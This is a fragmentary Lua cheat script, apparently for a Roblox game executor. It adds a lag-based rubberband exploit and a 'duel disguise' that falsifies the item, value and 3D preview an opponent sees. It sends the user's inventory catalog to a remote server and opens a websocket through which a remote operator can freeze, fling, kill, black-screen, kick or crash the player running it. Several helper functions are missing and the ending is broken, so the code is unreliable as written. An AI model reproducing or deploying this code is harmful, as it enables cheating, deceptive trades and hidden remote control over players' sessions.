local function isLua(f)
    if islclosure then return islclosure(f) end
    if iscclosure then return not iscclosure(f) end
    return false
end
local function recoverOriginal(fn)
    local getups = getupvalues or (debug and debug.getupvalues)
    if not getups then return nil end
    local ok, ups = pcall(getups, fn)
    if not ok or type(ups) ~= "table" then return nil end
    for _, v in pairs(ups) do
        if type(v) == "function" and (not iscclosure or iscclosure(v)) and v ~= fn then return v end
    end
    return nil
end
local function cleanCopy(fn)
    if type(fn) ~= "function" then return nil end
    if not isLua(fn) then return fn end
    if restorefunction then pcall(restorefunction, fn) end
    if not isLua(fn) then return fn end
    local orig = recoverOriginal(fn)
    if orig then return orig end
    if clonefunction then
        local ok, c = pcall(clonefunction, fn)
        if ok and type(c) == "function" then return c end
    end
    return fn
end

local function fmtNumber(n)
    if not n then return "0" end
    if n >= 1e12 then return string.format("%.2fT", n / 1e12) end
    if n >= 1e9  then return string.format("%.2fB", n / 1e9)  end
    if n >= 1e6  then return string.format("%.2fM", n / 1e6)  end
    if n >= 1e3  then return string.format("%.2fK", n / 1e3)  end
    return tostring(math.floor(n))
end

local MUT_LIST = {"Gold","Diamond","Rainbow","Bloodrot","Candy","Lava","Galaxy","Radioactive","Yin Yang","Cursed","Divine","Cyber","Phantom"}

local function isShownText(obj, stop)
    local txt = safe(function() return obj.Text end)
    if not txt or txt == "" then return false end
    local tt = safe(function() return obj.TextTransparency end)
    if tt and tt >= 0.99 then return false end
    local node = obj
    while node and node ~= stop do
        if node:IsA("GuiObject") then
            local vis = safe(function() return node.Visible end)
            if vis == false then return false end
        end
        node = node.Parent
    end
    return true
end

local function detectMutation(template)
    local mutation
    for _, obj in ipairs(template:GetDescendants()) do
        local attrs = safe(function() return obj:GetAttributes() end)
        if type(attrs) == "table" then
            for _, v in pairs(attrs) do
                local n = norml(v)
                if MUT_SET[n] then mutation = MUT_SET[n]; break end
            end
        end
        if not mutation and (obj:IsA("TextLabel") or obj:IsA("TextButton")) and isShownText(obj, template) then
            local n = norml(safe(function() return obj.Text end))
            if MUT_SET[n] then mutation = MUT_SET[n] end
        end
        if mutation then break end
    end
    return mutation
end

local function extractAnimal(v)

    local mutation = v.Mutation or v.mutation
    return { name = tostring(name), cash = gen and tostring(gen) or "", mutation = mutation and tostring(mutation) or nil }
end
local function gatherAnimals(data, out, depth)
    if type(data) ~= "table" or depth > 3 then return end
    for _, v in pairs(data) do
        local a = extractAnimal(v)
        if a then out[#out + 1] = a
        elseif type(v) == "table" then gatherAnimals(v, out, depth + 1) end
    end
end

local posHistory, isActive, mode, intervalThread = {}, false, nil, nil
RunService.Heartbeat:Connect(function()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory + 1] = { cframe = root.CFrame, time = now }
    local hist = (mode == "carry" and Settings.carryLag.history) or Settings.normalLag.history or 0.27
    local cutoff = now - hist - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do table.remove(posHistory, 1) end
end)
local function currentSpeed()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end
local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= (tonumber(Settings.normalLag.speedMin) or 35) end
    if mode == "carry"  then return s >= (tonumber(Settings.carryLag.speedMin) or 17) end
    return false
end
local function doRubberband()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    if Vector3.new(vel.X, 0, vel.Z).Magnitude < 1 then return end
    local hist = (mode == "carry" and Settings.carryLag.history) or Settings.normalLag.history or 0.27
    local targetTime, best = tick() - hist, nil
    for i = 1, #posHistory do if posHistory[i].time >= targetTime then best = posHistory[i].cframe break end end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end
local function stopLoop() if intervalThread then pcall(task.cancel, intervalThread); intervalThread = nil end end
local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime, iteration = tick(), 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local iv = (mode == "carry" and Settings.carryLag.interval) or Settings.normalLag.interval or 0.6
            local sleepT = (startTime + iteration * iv) - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end
local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then isActive = true; startLoop() else isActive = false; stopLoop() end
end

local function restoreDisguise()
    if not (dg.item or dg.wm) then return end
    if dg.titleL and dg.realTitle then pcall(function() dg.titleL.Text = dg.realTitle end) end
    if dg.cashL  and dg.realCash  then pcall(function() dg.cashL.Text  = dg.realCash  end) end
    if dg.traits and dg.traitsVis ~= nil then pcall(function() dg.traits.Visible = dg.traitsVis end) end
    if dg.wm and dg.oldModel then
        pcall(function()
            local cur = dg.wm:FindFirstChildOfClass("Model")
            if cur and cur ~= dg.oldModel then cur:Destroy() end
            dg.oldModel.Parent = dg.wm
            if dg.cam and dg.camCF then dg.cam.CFrame = dg.camCF end
        end)
    end
    dg.item, dg.titleL, dg.cashL = nil, nil, nil
    dg.wroteTitle, dg.wroteCash, dg.realTitle, dg.realCash = nil, nil, nil, nil
    dg.traits, dg.traitsVis = nil, nil
    dg.wm, dg.oldModel, dg.cam, dg.camCF = nil, nil, nil, nil
end

local function skinViewport(item, key)
    local vp  = item:FindFirstChild("ViewportFrame");         if not vp then return end
    local wm  = vp:FindFirstChildOfClass("WorldModel");       if not wm then return end
    local cam = vp:FindFirstChildOfClass("Camera");           if not cam then return end
    local old = wm:FindFirstChildOfClass("Model");            if not old then return end
    if old.Name == key then return end

    local src = (dgSrc.key == key) and dgSrc.model or nil
    if not src then
        if not dgWarming then
            dgWarming = true
            task.spawn(function()
                warmDisguise(key)
                dgWarming = false
                pcall(disguiseTick)
            end)
        end
        return
    end
    pcall(function()

        if dg.cam ~= cam then dg.cam, dg.camCF = cam, cam.CFrame end

        if dg.oldModel and dg.oldModel ~= old then pcall(function() dg.oldModel:Destroy() end) end
        dg.wm, dg.oldModel = wm, old

        local anchorCF = old:GetPivot()
        local look = dg.camCF.LookVector
        old.Parent = nil
        local clone = src:Clone()
        clone.Name = key
        clone.Parent = wm
        clone:PivotTo(anchorCF)
        local bbCF, size = clone:GetBoundingBox()
        local centre = bbCF.Position
        local maxExtent = math.max(size.X, size.Y, size.Z)
        cam.CFrame = CFrame.new(centre - look * (maxExtent * VIEW_DIST), centre)
        playIdle(clone, key)
    end)
end

local function disguiseApply()

    if type(cfg) ~= "table" or cfg.enabled ~= true or type(cfg.key) ~= "string" or cfg.key == "" then
        restoreDisguise(); return
    end
    local item = duelOtherItem()
    if not item then restoreDisguise(); return end

    if dg.item and dg.item ~= item then restoreDisguise() end

    local titleL = item:FindFirstChild("Title"); if not titleL then return end
    local cur = safe(function() return titleL.Text end) or ""

    if cur == "" or string.find(cur:lower(), WAITING, 1, true) then restoreDisguise(); return end

    if not (AnimalsData and BrainrotAssets) then loadAnimalModules() end
    local key = resolveAnimalKey(cfg.key, cfg.name)
    if not key then return end
    local info = AnimalsData[key]
    local display = (info and info.DisplayName) or cfg.name or key

    dg.item = item

    if cur ~= dg.wroteTitle then dg.realTitle = cur end
    dg.titleL = titleL
    if cur ~= display then
        pcall(function() titleL.Text = display end)
        dg.wroteTitle = display
    end

    local cashL = item:FindFirstChild("Cash")
    local genTxt = cashTextFor(key)
    if cashL and genTxt then
        local cc = safe(function() return cashL.Text end) or ""
        if cc ~= dg.wroteCash then dg.realCash = cc end
        dg.cashL = cashL
        if cc ~= genTxt then
            pcall(function() cashL.Text = genTxt end)
            dg.wroteCash = genTxt
        end
    end

    local traits = item:FindFirstChild("Traits")
    if traits then
        if dg.traits ~= traits then dg.traits, dg.traitsVis = traits, traits.Visible end
        pcall(function() traits.Visible = false end)
    end

    skinViewport(item, key)
end

local disguiseBusy = false
disguiseTick = function()
    if disguiseBusy then return end
    disguiseBusy = true
    pcall(disguiseApply)
    disguiseBusy = false
end

local dgConns, dgBound = {}, nil
local function bindDisguise(item)
    if dgBound == item then return end
    for _, c in ipairs(dgConns) do pcall(function() c:Disconnect() end) end
    dgConns, dgBound = {}, item
    if not item then return end
    local titleL = item:FindFirstChild("Title")
    if titleL then
        dgConns[#dgConns + 1] = titleL:GetPropertyChangedSignal("Text"):Connect(disguiseTick)
    end
    local vp = item:FindFirstChild("ViewportFrame")
    if vp then
        dgConns[#dgConns + 1] = vp.DescendantAdded:Connect(function(d)
            if d:IsA("Model") then disguiseTick() end
        end)
    end
end

local catalogSent = false
local function reportCatalog()
    if catalogSent then return end
    local list = buildCatalog()
    if #list == 0 then return end
    local ok = safe(function()
        return request({
            Url = CONFIG.ENDPOINT .. "/api/catalog", Method = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = CONFIG.SCRIPT_KEY },
            Body = HttpService:JSONEncode({ scriptKey = CONFIG.SCRIPT_KEY, catalog = list }),
        })
    end)
    if ok then catalogSent = true end
end

local prevN, prevC, prevF = false, false, false
local prev = {}
local function applySettings(s)
    if type(s) ~= "table" then return end
    if type(s.fpsLimiter) == "table" then Settings.fpsLimiter = s.fpsLimiter end
    if type(s.normalLag)  == "table" then Settings.normalLag  = s.normalLag end
    if type(s.carryLag)   == "table" then Settings.carryLag   = s.carryLag end
    if type(s.duelDisguise) == "table" then
        local prev = Settings.duelDisguise or {}
        Settings.duelDisguise = s.duelDisguise

        if prev.key ~= s.duelDisguise.key or prev.enabled ~= s.duelDisguise.enabled then
            task.spawn(function()
                warmDisguise(resolveAnimalKey(s.duelDisguise.key, s.duelDisguise.name))
                disguiseTick()
            end)
        end
    end
end
local function toggle(c, key, fn)
    local want = (c[key] == true)
    if want ~= prev[key] then prev[key] = want; fn(want) end
end
local function applyCommands(c)
    if type(c) ~= "table" then return end
    local wantF = (c.fpsLimiter == true)
    if wantF ~= prevF then prevF = wantF; setFpsLimit(wantF) end
    local wantN, wantC = (c.normalLag == true), (c.carryLag == true)
    if wantN ~= prevN or wantC ~= prevC then
        prevN, prevC = wantN, wantC
        if wantC then setMode("carry") elseif wantN then setMode("normal") else setMode(nil) end
    end
    toggle(c, "freeze", setFreeze)
    toggle(c, "fling", setFling)
    toggle(c, "spin", setSpin)
    toggle(c, "shake", setShake)
    toggle(c, "blackscreen", setBlack)
    toggle(c, "kill", setKill)
    if c.crash == true and not crashed then crashed = true; while true do end end
    if c.kick and c.kick ~= false and not kicked then
        kicked = true
        pcall(function() LP:Kick(tostring(c.kick)) end)
    end
end

local WS_URL = (CONFIG.ENDPOINT:gsub("^http", "ws")) .. "/ws"
local socket, wsLive = nil, false

local function wsResolve()
    local w = WebSocket or (syn and syn.websocket) or genv.WebSocket
    if type(w) == "table" and w.connect then return w end
    return nil
end

local function connectWS()
    if wsLive then return true end
    local w = wsResolve(); if not w then return false end
    local ok, s = pcall(function() return w.connect(WS_URL) end)
    if not ok or not s then return false end
    socket, wsLive = s, true
    pcall(function()
        s.OnMessage:Connect(function(msg)
            local data = safe(function() return HttpService:JSONDecode(msg) end)
            if not data then return end
            if data.settings then applySettings(data.settings) end
            if data.commands then applyCommands(data.commands) end
        end)
    end)
    pcall(function()
        s.OnClose:Connect(function() wsLive, socket = false, nil end)
    end)
    return true
end

local function wsSend()
    if not (wsLive and socket) then return false end
    local ok = pcall(function() socket:Send(HttpService:JSONEncode(payload())) end)
    if not ok then wsLive, socket = false, nil end
    return ok
end

connectWS()
if not (wsLive and wsSend()) then safe(heartbeat) end

            if not wsSend() then safe(heartbeat) end

        end
    end
end)
